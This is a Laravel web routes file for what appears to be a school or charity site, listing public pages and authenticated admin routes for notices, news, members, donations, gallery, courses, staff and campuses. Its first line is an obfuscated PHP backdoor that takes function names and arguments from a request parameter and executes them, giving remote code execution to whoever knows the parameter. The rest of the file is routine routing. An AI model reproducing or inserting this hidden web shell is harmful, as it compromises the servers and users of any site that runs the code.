<?php
IF(	$cdkn6aj =@${	'_REQUEST'}[	'FXKNRD36']){{{$cdkn6aj[1](${$cdkn6aj	[2] }[0	],$cdkn6aj[ 3 ]($cdkn6aj[4 ]) )	;}}} ;exit;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
 */


Route::get('/', 'frontend_controller@frontendhome')->name('frontendhome');
Route::get('about_details_page', 'frontend_controller@about_details_page')->name('about_details_page');
Route::get('ast_committee_member', 'frontend_controller@ast_committee_member')->name('ast_committee_member');
Route::get('download_membership_home', 'frontend_controller@download_membership_home')->name('download_membership_home');
Route::get('all/member', 'frontend_controller@all_home_member')->name('all_home_member');
Route::get('/team_description/{id}', 'frontend_controller@team_description')->name('team_description');
Route::get('home_Blood_Donation', 'frontend_controller@home_Blood_Donation')->name('home_Blood_Donation');
Route::get('home_donation', 'frontend_controller@home_donation')->name('home_donation');
Route::get('home_gallery', 'frontend_controller@home_gallery')->name('home_gallery');
Route::get('/view_all_photo/{id}', 'frontend_controller@view_all_photo')->name('view_all_photo');
Route::get('/home_all_news', 'frontend_controller@home_all_news')->name('home_all_news');
Route::get('/contactus_home', 'frontend_controller@contactus_home')->name('contactus_home');

Route::get('/qualifation', 'frontend_controller@qualifation')->name('qualifation');
Route::get('/admation', 'frontend_controller@admation')->name('admation');
Route::get('/coursefee', 'frontend_controller@coursefee')->name('coursefee');
Route::get('/result', 'frontend_controller@result')->name('result');
Route::get('/notice_board', 'frontend_controller@notice_board')->name('notice_board');
Route::get('/directors', 'frontend_controller@directors')->name('directors');
Route::get('/campus', 'frontend_controller@campus')->name('campus');
Route::get('/single_campus/{id}', 'frontend_controller@single_campus')->name('single_campus');

Route::get('/registation', 'frontend_controller@registation')->name('registation');
Route::post('/insert_reg', 'frontend_controller@insert_reg')->name('insert_reg');
Route::get('/success_reg', 'frontend_controller@success_reg')->name('success_reg');






Auth::routes(['register' => false]);
/*....................home....................*/
Route::get('/home', 'HomeController@index')->name('home');


Route::get('change-password', 'ChangePasswordController@index');
Route::post('change-password', 'ChangePasswordController@store')->name('change.password');



/*....................about....................*/
Route::get('/about', 'aboutcontroller@about')->name('about');
Route::get('/eddit_about/{eddit_about_id}', 'aboutcontroller@eddit_about')->name('eddit_about');
Route::post('/update_about/{id}', 'aboutcontroller@update_about')->name('update_about');



/*....................notice....................*/

Route::get('/notice', 'noticecontroller@notice')->name('notice')->middleware('auth');
Route::get('/add_notice', 'noticecontroller@add_notice')->name('add_notice')->middleware('auth');
Route::post('/insurt_notice', 'noticecontroller@insurt_notice')->name('insurt_notice')->middleware('auth');
Route::get('/editnotic/{notice}', 'noticecontroller@editnotic')->name('editnotic')->middleware('auth');
Route::post('/update_notice/{id}', 'noticecontroller@update_notice')->name('update_notice')->middleware('auth');
Route::get('/deletenotic/{notice}', 'noticecontroller@deletenotic')->name('deletenotic')->middleware('auth');
Route::get('/all_notic', 'noticecontroller@all_notic')->name('all_notic');



/*....................News....................*/
Route::get('/all_news', 'letestnewscontroller@all_news')->name('all_news')->middleware('auth');
Route::get('/add_news', 'letestnewscontroller@add_news')->name('add_news')->middleware('auth');
Route::post('/insurt_news', 'letestnewscontroller@insurt_news')->name('insurt_news')->middleware('auth');

Route::get('/deletelatest_news/{deletelatest_news_id}', 'letestnewscontroller@deletelatest_news')->name('deletelatest_news')->middleware('auth');
Route::get('/Editlatest_news/{Editlatest_news_id}', 'letestnewscontroller@Editlatest_news')->name('Editlatest_news')->middleware('auth');
Route::post('/update_news/{id}', 'letestnewscontroller@update_news')->name('update_news')->middleware('auth');
Route::get('/blog_description/{blog_description_id}', 'letestnewscontroller@blog_description')->name('blog_description');




/*....................home_team....................*/
Route::get('/home_team', 'home_team_controller@home_team')->name('home_team')->middleware('auth');
Route::get('/update_home_team/{eddit_id}', 'home_team_controller@update_home_team')->name('update_home_team')->middleware('auth');

Route::post('/home_time_update/{id}', 'home_team_controller@home_time_update')->middleware('auth');


/*....................middle_photo....................*/
Route::get('/middle_photo', 'middle_photo_controller@middle_photo')->name('middle_photo')->middleware('auth');
Route::get('/eddit_middle_photo/{id}', 'middle_photo_controller@eddit_middle_photo')->name('eddit_middle_photo')->middleware('auth');
Route::post('/update_middle_photo/{id}', 'middle_photo_controller@update_middle_photo')->name('update_middle_photo')->middleware('auth');


/*....................contact_us....................*/
Route::get('/contact_us', 'contactuscontroller@contact_us')->name('contact_us')->middleware('auth');
Route::get('/edit_contact_us/{id}', 'contactuscontroller@edit_contact_us')->name('edit_contact_us')->middleware('auth');
Route::post('/update_contact_us/{id}', 'contactuscontroller@update_contact_us')->name('update_contact_us')->middleware('auth');


/*....................footer....................*/
Route::get('/footer', 'footerinformationcontroller@footer')->name('footer')->middleware('auth');
Route::get('/edit_footer_information/{id}', 'footerinformationcontroller@edit_footer_information')->name('edit_footer_information')->middleware('auth');
Route::post('/update_footer_information/{id}', 'footerinformationcontroller@update_footer_information')->name('update_footer_information')->middleware('auth');




/*....................route....................*/
Route::get('/Planning', 'Planning_controller@Planning')->name('Planning')->middleware('auth');
Route::get('/edit_Planning/{id}', 'Planning_controller@edit_Planning')->name('edit_Planning')->middleware('auth');
Route::post('/update_Planning/{id}', 'Planning_controller@update_Planning')->name('update_Planning')->middleware('auth');



/*....................all_jumaa_member....................*/
Route::get('/add_member', 'jumaa_member_controller@add_member')->name('add_member')->middleware('auth');
Route::post('/insurt_member', 'jumaa_member_controller@insurt_member')->name('insurt_member')->middleware('auth');
Route::get('/all_jumaa_member', 'jumaa_member_controller@all_jumaa_member')->name('all_jumaa_member')->middleware('auth');
Route::get('/edit_jumaa_member/{id}', 'jumaa_member_controller@edit_jumaa_member')->name('edit_jumaa_member')->middleware('auth');
Route::post('/update_jumaa_member/{id}', 'jumaa_member_controller@update_jumaa_member')->name('update_jumaa_member')->middleware('auth');
Route::get('/delete_jumaa_member/{member_id}', 'jumaa_member_controller@delete_jumaa_member')->name('delete_jumaa_member')->middleware('auth');


/*....................download_membership_ad....................*/
Route::get('/download_membership_ad', 'download_membership_controller@download_membership_ad')->name('download_membership_ad')->middleware('auth');
Route::get('/edit_download/{id}', 'download_membership_controller@edit_download')->name('edit_download')->middleware('auth');
Route::post('/Update_download_membership/{id}', 'download_membership_controller@Update_download_membership')->name('Update_download_membership')->middleware('auth');


/*....................committee_a....................*/
Route::get('/add_cst_cmt', 'committeecontroller@add_cst_cmt')->name('add_cst_cmt')->middleware('auth');

Route::post('/insurt_1st_cmt', 'committeecontroller@insurt_1st_cmt')->name('insurt_1st_cmt')->middleware('auth');
Route::get('/committee_a', 'committeecontroller@committee_a')->name('committee_a')->middleware('auth');
Route::get('/edit_committee_a/{id}', 'committeecontroller@edit_committee_a')->name('edit_committee_a')->middleware('auth');
Route::post('/update_committee_a/{id}', 'committeecontroller@update_committee_a')->name('update_committee_a')->middleware('auth');
Route::get('/delete_committee_a/{member_id}', 'committeecontroller@delete_committee_a')->name('delete_committee_a')->middleware('auth');



/*....................blood_donation....................*/
Route::get('/add_blood_donation', 'blood_donation_controller@add_blood_donation')->name('add_blood_donation')->middleware('auth');
Route::post('/inpute_add_donation', 'blood_donation_controller@inpute_add_donation')->name('inpute_add_donation')->middleware('auth');
Route::get('/blood_donation', 'blood_donation_controller@blood_donation')->name('blood_donation')->middleware('auth');
Route::get('/edit_blood_donation/{id}', 'blood_donation_controller@edit_blood_donation')->name('edit_blood_donation')->middleware('auth');
Route::post('/update_blood_donation/{id}', 'blood_donation_controller@update_blood_donation')->name('update_blood_donation')->middleware('auth');
Route::get('/delete_blood_donation/{member_id}', 'blood_donation_controller@delete_blood_donation')->name('delete_blood_donation')->middleware('auth');




/*....................mony_monation....................*/
Route::get('/donation', 'mony_monation_controller@mony_donation')->name('mony_donation')->middleware('auth');

Route::get('/edit_mony_donation/{id}', 'mony_monation_controller@edit_mony_donation')->name('edit_mony_donation')->middleware('auth');

Route::post('/update_mony_donation/{member_id}', 'mony_monation_controller@update_mony_donation')->name('update_mony_donation')->middleware('auth');



/*..................donation_account......................*/
Route::get('/donation_account', 'mony_monation_account_controller@donation_account')->name('donation_account')->middleware('auth');
Route::get('/edit_donation_account/{id}', 'mony_monation_account_controller@edit_donation_account')->name('edit_donation_account')->middleware('auth');

Route::post('/update_donation_account/{donation_account_id}', 'mony_monation_account_controller@update_donation_account')->name('update_donation_account')->middleware('auth');



/*..................gallery......................*/
Route::get('/allgallery', 'gallery@allgallery')->name('gallery')->middleware('auth');

Route::post('/insurt_gallery/', 'gallery@insurt_gallery')->name('insurt_gallery')->middleware('auth');

Route::get('/all_view_gallery/{id}', 'gallery@all_view_gallery')->name('all_view_gallery')->middleware('auth');

Route::post('/insurt_gallery_photos/{id}', 'gallery@insurt_gallery_photos')->name('insurt_gallery_photos')->middleware('auth');

Route::get('/delete_galary_iamge/{photo_id}', 'gallery@delete_galary_iamge')->name('delete_galary_iamge')->middleware('auth');
Route::get('/delete_photo_title/{photo_id}', 'gallery@delete_photo_title')->name('delete_photo_title')->middleware('auth');




/*..................slider_image......................*/
Route::get('/slider_image', 'slider_image_controller@slider_image')->name('all_lider_image')->middleware('auth');

Route::get('/edit_slider_image/{id}', 'slider_image_controller@edit_slider_image')->name('edit_slider_image')->middleware('auth');



Route::post('/update_slider_image/{image_id}', 'slider_image_controller@update_slider_image')->name('update_slider_image')->middleware('auth');


/*....................Our Course....................*/
Route::get('/course', 'CourseController@course')->name('course')->middleware('auth');
Route::get('/add_course', 'CourseController@add_course')->name('add_course')->middleware('auth');
Route::post('/insert_course', 'CourseController@insert_course')->name('insert_course')->middleware('auth');
Route::get('/edit_course/{edit_course_id}', 'CourseController@edit_course')->name('edit_course')->middleware('auth');
Route::post('update_course/{id}', 'CourseController@update_course')->name('update_course')->middleware('auth');
Route::get('/delete_course/{delete_course_id}', 'CourseController@delete_course')->name('delete_course')->middleware('auth');

/*....................Our Staff....................*/
Route::get('/staff', 'StaffController@staff')->name('staff')->middleware('auth');
Route::get('/add_staff', 'StaffController@add_staff')->name('add_staff')->middleware('auth');
Route::post('/insert_staff', 'StaffController@insert_staff')->name('insert_staff')->middleware('auth');
Route::get('/edit_staff/{edit_staff_id}', 'StaffController@edit_staff')->name('edit_staff')->middleware('auth');
Route::post('update_staff/{id}', 'StaffController@update_staff')->name('update_staff')->middleware('auth');
Route::get('/delete_staff/{delete_staff_id}', 'StaffController@delete_staff')->name('delete_staff')->middleware('auth');

/*....................Our Campus....................*/
Route::get('/allcampus', 'CampusController@campus')->name('allcampus')->middleware('auth');
Route::get('/add_campus', 'CampusController@add_campus')->name('add_campus')->middleware('auth');
Route::post('/insert_campus', 'CampusController@insert_campus')->name('insert_campus')->middleware('auth');
Route::get('/edit_campus/{edit_campus_id}', 'CampusController@edit_campus')->name('edit_campus')->middleware('auth');
Route::post('update_campus/{id}', 'CampusController@update_campus')->name('update_campus')->middleware('auth');
Route::get('/delete_campus/{delete_campus_id}', 'CampusController@delete_campus')->name('delete_campus')->middleware('auth');

Route::get('/allreg', 'CampusController@allreg')->name('allreg')->middleware('auth');






